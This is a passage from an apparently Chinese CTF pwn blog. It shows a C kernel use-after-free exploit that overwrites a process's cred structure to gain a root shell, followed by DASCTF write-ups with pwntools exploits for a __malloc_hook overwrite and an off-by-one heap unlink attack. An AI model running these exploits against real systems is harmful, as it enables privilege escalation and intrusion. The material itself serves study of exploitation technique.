class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//申请两个设备</span></span><br><span class="line">    <span class="keyword">int</span> fd1 = <span class="built_in">open</span>(<span class="string">"/dev/babydev"</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = <span class="built_in">open</span>(<span class="string">"/dev/babydev"</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fd1:%d\n"</span>,fd1);<span class="comment">//文件描述符3</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fd2:%d\n"</span>,fd2);<span class="comment">//文件描述符4</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 修改device_buf_len 为 sizeof(struct cred)</span></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xA8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放fd1，此时，LKMs2的device_buf将指向一块大小为sizeof(struct cred)的已free的内存</span></span><br><span class="line">    <span class="built_in">close</span>(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新起进程的 cred 空间将占用那一块已free的内存</span></span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*] fork error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 篡改新进程的 cred 的 uid，gid 等值为0</span></span><br><span class="line">        <span class="keyword">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">write</span>(fd2, zeros, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[+] root now."</span>);</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(fd2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210606154209689.png" alt="image-20210606154209689"></p>

	
	</div>
  <a type="button" href="/2021/06/05/kernel-study/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/13/Mar-DASCTF明御攻防赛/" >Mar.DASCTF明御攻防赛</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-13  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="fruitpie"><a href="#fruitpie" class="headerlink" title="fruitpie"></a>fruitpie</h2><blockquote>
<p>思路挺简单的</p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
<p>基本上分为四部分。</p>
<ol>
<li>输入要分配的chunk大小，打印chunk地址</li>
<li>输入与分配chunk的偏移，往该地址中输入0x10数据。</li>
<li>malloc(0xA0) =&gt; 很明显是要覆盖__malloc_hook</li>
<li>close(1) =&gt; 关闭输出，所以要重定向（本地就不需要了）</li>
</ol>
</blockquote>
<p><img src="/2021/05/13/Mar-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210428214311968.png" alt="image-20210428214311968"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><blockquote>
<p>根据程序的四个功能，一步步来做</p>
</blockquote>
<ol>
<li><p>给定chunk大小并打印</p>
<p>可以输入一个很大的chunk（和<a href="https://warm-winter.github.io/2021/04/27/%C2%96gyctf-2020-force/#1-%E5%88%86%E9%85%8D%E5%A4%A7%E5%9D%97" target="_blank" rel="noopener">高校战役force</a>的第一步操作类似），泄露的块地址和libc_base偏移固定，故可以得到libc_base</p>
</li>
<li><p>输入偏移，输入数据</p>
<ol>
<li><p>偏移计算</p>
<ul>
<li><p>由功能3可以明确知道，是要覆盖__malloc_hook</p>
</li>
<li><p>由功能1得到了libc_base，可以计算__malloc_hook的地址</p>
</li>
<li><p>故可以利用<code>__malloc_hook地址 - chunk地址 = offset</code></p>
</li>
</ul>
</li>
<li><p>数据</p>
<ul>
<li>输入one_gadget地址即可</li>
<li>本地不需要调整栈帧，直接发送one_gadget即可</li>
</ul>
</li>
</ol>
</li>
<li><p>malloc(0xA0)</p>
<p>即可get shell</p>
</li>
<li><p>close(1) [本地不需要]</p>
<p>需要输出重定向</p>
<p><code>&quot;exec 1&gt;&amp;0&quot;</code></p>
</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-基本信息"><a href="#0-基本信息" class="headerlink" title="0.基本信息"></a>0.基本信息</h4><blockquote>
<p>保护全开，libc是2.27的</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;fruitpie&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;mar&#x2F;fruitpie$ strings libc.so.6 | grep GNU</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.</span><br><span class="line">Compiled by GNU CC version 7.5.0.</span><br></pre></td></tr></table></figure>

<h4 id="1-分配大块，计算libc-base"><a href="#1-分配大块，计算libc-base" class="headerlink" title="1.分配大块，计算libc_base"></a>1.分配大块，计算libc_base</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Sent 0x8 bytes:</span><br><span class="line">    &#39;1048576\n&#39;</span><br><span class="line">[DEBUG] Received 0x17 bytes:</span><br><span class="line">    &#39;0x7f06e5785010\n&#39;</span><br><span class="line">    &#39;Offset:\n&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x55d2669e0000     0x55d2669e2000 r-xp     2000 0      &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;fruitpie</span><br><span class="line">    0x55d266be1000     0x55d266be2000 r--p     1000 1000   &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;fruitpie</span><br><span class="line">    0x55d266be2000     0x55d266be3000 rw-p     1000 2000   &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;fruitpie</span><br><span class="line">    0x55d266c68000     0x55d266c89000 rw-p    21000 0      [heap]</span><br><span class="line">    0x7f06e526e000     0x7f06e5455000 r-xp   1e7000 0      &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;libc.so.6</span><br><span class="line">    0x7f06e5455000     0x7f06e5655000 ---p   200000 1e7000 &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;libc.so.6</span><br><span class="line">    0x7f06e5655000     0x7f06e5659000 r--p     4000 1e7000 &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;libc.so.6</span><br><span class="line">    0x7f06e5659000     0x7f06e565b000 rw-p     2000 1eb000 &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;libc.so.6</span><br><span class="line">    0x7f06e565b000     0x7f06e565f000 rw-p     4000 0      </span><br><span class="line">    0x7f06e565f000     0x7f06e5688000 r-xp    29000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">    0x7f06e5785000     0x7f06e5888000 rw-p   103000 0      </span><br><span class="line">    0x7f06e5888000     0x7f06e5889000 r--p     1000 29000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">    0x7f06e5889000     0x7f06e588a000 rw-p     1000 2a000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">    0x7f06e588a000     0x7f06e588b000 rw-p     1000 0      </span><br><span class="line">    0x7ffe87583000     0x7ffe875a4000 rw-p    21000 0      [stack]</span><br><span class="line">    0x7ffe875bd000     0x7ffe875c0000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffe875c0000     0x7ffe875c2000 r-xp     2000 0      [vdso]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure>

<p><code>0x7f06e5785010 - 0x7f06e526e000 = 0x517010</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">"Enter the size to malloc:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">1048576</span>))</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">chunk_base = int(p.recv(<span class="number">12</span>).strip(),<span class="number">16</span>)</span><br><span class="line">log.success(hex(chunk_base))</span><br><span class="line"></span><br><span class="line">libc_base = chunk_base - <span class="number">0x517010</span></span><br><span class="line">log.success(hex(libc_base))</span><br></pre></td></tr></table></figure>

<h4 id="2-计算偏移，发送数据"><a href="#2-计算偏移，发送数据" class="headerlink" title="2.计算偏移，发送数据"></a>2.计算偏移，发送数据</h4><blockquote>
<p>偏移就是<code>offset = malloc_hook - chunk_base</code></p>
<p>数据就是<code>onegadget[1]+libc_base</code></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">offset = malloc_hook - chunk_base</span><br><span class="line">p.recvuntil(<span class="string">"Offset:"</span>)</span><br><span class="line">p.sendline(hex(offset))</span><br><span class="line"></span><br><span class="line">onegadget = [<span class="number">0x415e6</span>,<span class="number">0x4163a</span>,<span class="number">0xdfac1</span>]</span><br><span class="line">p.recvuntil(<span class="string">"Data:"</span>)</span><br><span class="line">payload = p64(onegadget[<span class="number">1</span>]+libc_base)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>因为程序不支持调试，所以需要用支持debug版本的libc才能看得到，，，<del>懒得再整一遍了orz</del></p>
</blockquote>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">"./fruitpie"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/usr/local/glibc-2.27/lib/libc-2.27.so")</span></span><br><span class="line"><span class="comment"># p = process(["/usr/local/glibc-2.27/lib/ld-2.27.so", "./fruitpie"],</span></span><br><span class="line">            <span class="comment"># env=&#123;"LD_PRELOAD":"/usr/local/glibc-2.27/lib/libc-2.27.so"&#125;)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">"./fruitpie"</span>,env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Enter the size to malloc:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">1048576</span>))</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">chunk_base = int(p.recv(<span class="number">12</span>).strip(),<span class="number">16</span>)</span><br><span class="line">log.success(hex(chunk_base))</span><br><span class="line"></span><br><span class="line">libc_base = chunk_base - <span class="number">0x517010</span></span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">offset = malloc_hook - chunk_base</span><br><span class="line">p.recvuntil(<span class="string">"Offset:"</span>)</span><br><span class="line">p.sendline(hex(offset))</span><br><span class="line"></span><br><span class="line">onegadget = [<span class="number">0x415e6</span>,<span class="number">0x4163a</span>,<span class="number">0xdfac1</span>]</span><br><span class="line">p.recvuntil(<span class="string">"Data:"</span>)</span><br><span class="line">payload = p64(<span class="number">0x10a45c</span>+libc_base)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="babybabybabyheap"><a href="#babybabybabyheap" class="headerlink" title="babybabybabyheap"></a>babybabybabyheap</h2><blockquote>
<p>2.31的off by one</p>
</blockquote>
<h3 id="程序流程-1"><a href="#程序流程-1" class="headerlink" title="程序流程"></a>程序流程</h3><p>由四个功能，其中exit功能中有一个隐藏功能edit</p>
<ol>
<li>程序一开始就送了一个puts的地址，可以计算libc地址</li>
<li>add：根据idx，size，content创建块，其中chunk指针被放入heap_list，长度也存入了size_list</li>
<li>show：根据idx，打印chunk内容</li>
<li>delete：根据size判断是否是否，size_list被置零，不存在uaf</li>
<li>隐藏功能edit：根据idx，修改内容，但是存在off by one</li>
</ol>
<h4 id="puts地址"><a href="#puts地址" class="headerlink" title="puts地址"></a>puts地址</h4><p>ida反汇编并没有看到这个地址，汇编里面可以清楚看到</p>
<p><img src="/2021/05/13/Mar-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210513201026622.png" alt="image-20210513201026622"></p>
<p><img src="/2021/05/13/Mar-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210513201127385.png" alt="image-20210513201127385"></p>
<h4 id="隐藏edit功能"><a href="#隐藏edit功能" class="headerlink" title="隐藏edit功能"></a>隐藏edit功能</h4><p>main函数反汇编并不好看，直接汇编更加清楚</p>
<p><img src="/2021/05/13/Mar-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210513194930539.png" alt="image-20210513194930539"></p>
<p><img src="/2021/05/13/Mar-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210513195209948.png" alt="image-20210513195209948"></p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h4><h5 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h5><p>在输入函数中，将最后两位置零</p>
<p><img src="/2021/05/13/Mar-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210513195310404.png" alt="image-20210513195310404"></p>
<p>add函数中，没有off by one</p>
<p><img src="/2021/05/13/Mar-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210513195431863.png" alt="image-20210513195431863"></p>
<p>edit函数中，存在off by one</p>
<p><img src="/2021/05/13/Mar-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210513195449902.png" alt="image-20210513195449902"></p>
<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>分配程序，利用off by one，可以将size中代表前面是否释放的1位置零，使得上一个chunk被认为释放，并进行unlink操作。</p>
<p>例如：分配四个块：</p>
<ul>
<li>chunk1 = 0x108（堆块重叠）</li>
<li>chunk2 = 0x118</li>
<li>chunk3 = 0x1f8（0x201（最后0x10是chunk头，0x1表示上一个块未释放））</li>
<li>chunk4 = 0x118（和chunk2相同，为了放在同一链中，chunk2 -&gt; chunk4，修改chunk2中的内容，就可以任意地址申请chunk了）</li>
</ul>
<p>首先在chunk1中伪造一个fake_chunk</p>
<p>通过chunk2可以将chunk3的大小改为0x200，并修改pre_size为chunk1+chunk2，这样，释放chunk3的时候，会以为fake_chunk也被释放，程序会进行unlink操作，合并三个chunk，这样chunk1和chunk2都是used，和fake_chunk中有重叠。</p>
<h3 id="详细过程-1"><a href="#详细过程-1" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-基本信息-1"><a href="#0-基本信息-1" class="headerlink" title="0.基本信息"></a>0.基本信息</h4><blockquote>
<p>stripped代表程序去掉了符号表，需要使用debug版本的glibc进行调试</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;mar&#x2F;babybabybabyheap$ file babyheap</span><br><span class="line">babyheap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, BuildID[sha1]&#x3D;c05390deb68a417f8d87365fd817c6396eca7462, for GNU&#x2F;Linux 3.2.0, stripped</span><br></pre></td></tr></table></figure>

<blockquote>
<p>没开pie和relro，地址固定，并且可以修改got表</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;ctf$ checksec babyheap </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;ctf&#x2F;babyheap&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>####</p>
<h4 id="1-申请七个块"><a href="#1-申请七个块" class="headerlink" title="1.申请七个块"></a>1.申请七个块</h4><blockquote>
<p>这七个块主要用来填满tcache。但是要在使用的四个chunk申请之后释放，不然会把这七个块中申请过来</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for i in range(7):</span><br><span class="line">	add(i+2,0x1f8,&#39;winter&#39;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995000</span><br><span class="line">Size: 0x291</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995290</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995490</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995690</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995890</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995a90</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995c90</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995e90</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556996090</span><br><span class="line">Size: 0x1ff71</span><br></pre></td></tr></table></figure>

<h4 id="2-申请使用的四个块"><a href="#2-申请使用的四个块" class="headerlink" title="2.申请使用的四个块"></a>2.申请使用的四个块</h4><blockquote>
<p>在第一个chunk伪造一个chunk，做unlink攻击</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x108</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x221</span>)+p64(fd)+p64(bk))</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x118</span>,<span class="string">'winter'</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x1f8</span>,<span class="string">'winter'</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x118</span>,<span class="string">'winter'</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557ec090</span><br><span class="line">Size: 0x111</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557ec1a0</span><br><span class="line">Size: 0x121</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557ec2c0</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557ec4c0</span><br><span class="line">Size: 0x121</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557ec5e0</span><br><span class="line">Size: 0x1fa21</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x5555557ec090</span><br><span class="line">0x5555557ec090:	0x0000000000000000	0x0000000000000111</span><br><span class="line">0x5555557ec0a0:	0x0000000000000000	0x0000000000000221</span><br><span class="line">0x5555557ec0b0:	0x0000000000404128	0x0000000000404130</span><br><span class="line">0x5555557ec0c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557ec0d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="3-释放七个块，填满tcache"><a href="#3-释放七个块，填满tcache" class="headerlink" title="3.释放七个块，填满tcache"></a>3.释放七个块，填满tcache</h4><blockquote>
<p>tcache填满，才会进行unlink，不然直接释放进入tcache中了</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	delete(i+<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x200 [  7]: 0x555555fd6ea0 —▸ 0x555555fd6ca0 —▸ 0x555555fd6aa0 —▸ 0x555555fd68a0 —▸ 0x555555fd66a0 —▸ 0x555555fd64a0 —▸ 0x555555fd62a0 ◂— 0x0</span><br></pre></td></tr></table></figure>

<h4 id="4-off-by-one"><a href="#4-off-by-one" class="headerlink" title="4.off by one"></a>4.off by one</h4><blockquote>
